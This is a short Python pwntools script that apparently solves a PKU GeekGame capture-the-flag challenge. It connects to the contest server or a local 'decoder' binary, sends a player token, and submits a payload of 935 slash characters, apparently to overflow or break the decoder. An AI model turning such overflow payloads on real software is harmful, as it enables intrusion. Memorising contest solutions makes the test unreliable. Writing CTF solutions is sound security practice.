#!/usr/bin/env python

import pwn as p

local = False
p.context.log_level = "debug"
# Supply your token
token = ""

token = p.os.environ.get("PKU_GEEK_GAME_TOKEN", token)

if local:
	connection = p.process("./decoder")
else:
	connection = p.remote("prob06.geekgame.pku.edu.cn", 10006)
	connection.recvuntil(b"Please input your token:")
	connection.sendline(token.encode())
connection.recvline()
connection.recvuntil(b"guess flag (base64): ")

p.pause()
payload = b"/" * 935

p.log.info("Payload: " + repr(payload))
connection.sendline(payload)
print(connection.recvall())

